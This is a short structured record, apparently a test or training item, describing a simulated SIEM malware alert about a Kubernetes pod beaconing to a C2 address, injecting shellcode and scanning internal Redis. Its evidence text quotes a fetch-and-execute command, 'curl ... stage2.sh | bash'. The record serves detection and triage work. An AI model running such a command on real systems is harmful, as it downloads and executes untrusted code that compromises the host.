description: SIEM malware detection — lateral movement with C2 beacon
evidence_text: SIEM incident detected: category=malware severity=critical. Pod omni-worker-7d4b9 in namespace multi-agent is making periodic outbound connections to 198.51.100.5:4444 every 60s (C2 beacon pattern). Network policy blocks external egress but 198.51.100.5 is in the allowed CIDR range (misconfiguration). Process 'python3' spawned child process 'curl -s http://198.51.100.5/stage2.sh | bash'. File /tmp/.hidden_proc created 2h ago. Memory dump shows shellcode injection pattern. eBPF probe confirms syscall sequence: mmap+mprotect+execve (shellcode loader). Lateral movement detected: pod is probing internal Redis on port 6379 via nmap scan.
